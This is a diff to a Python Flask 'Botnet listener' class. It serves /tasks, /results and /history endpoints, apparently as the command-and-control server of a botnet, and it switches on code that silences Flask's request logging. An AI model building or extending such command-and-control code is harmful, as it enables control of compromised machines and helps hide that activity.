@@ -8,6 +8,10 @@ from flask_restful import Api
 from database.db import initialize_db
 
 class Listener_HTTP(threading.Thread):
+    def __init__(self, loggers):
+        threading.Thread.__init__(self)
+        self.loggers = loggers
+
     def run(self):
         # Flask app initialization
         app = Flask(__name__)
@@ -22,13 +26,13 @@ class Listener_HTTP(threading.Thread):
 
         # Define the routes for each of our resources
         api.add_resource(resources.Tasks, '/tasks', endpoint='tasks')
-        api.add_resource(resources.Results, '/results')
+        api.add_resource(resources.Results, '/results', resource_class_kwargs={'logger': self.loggers})
         api.add_resource(resources.History, '/history')
 
         # Disable Flask's default logger
-        #log = logging.getLogger('werkzeug')
-        #log.disabled = True
-        #app.logger.disabled = True
+        log = logging.getLogger('werkzeug')
+        log.disabled = True
+        app.logger.disabled = True
 
         print(f"[* Listener-Msg] Starting Botnet listener on http://0.0.0.0:5000\n")
         app.run(host="0.0.0.0", port=5000)
